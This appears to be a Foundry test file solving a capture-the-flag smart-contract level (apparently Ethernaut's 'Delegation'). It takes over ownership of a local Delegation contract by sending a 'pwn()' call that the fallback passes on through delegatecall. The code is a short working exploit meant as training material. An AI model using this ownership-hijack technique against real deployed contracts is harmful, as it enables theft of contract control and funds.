// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level06.sol";
import "forge-std/Test.sol";

contract ExploitLevel06 is Test {
    Delegate delegate = new Delegate(address(this));
    Delegation instance = new Delegation(address(delegate));
    address player = 0x9606e11178a83C364108e99fFFD2f7F75C99d801;

    function testExploit() external {
        vm.prank(player);
        address(instance).call(abi.encodeWithSignature("pwn()"));
        console.log(instance.owner());
    }
}
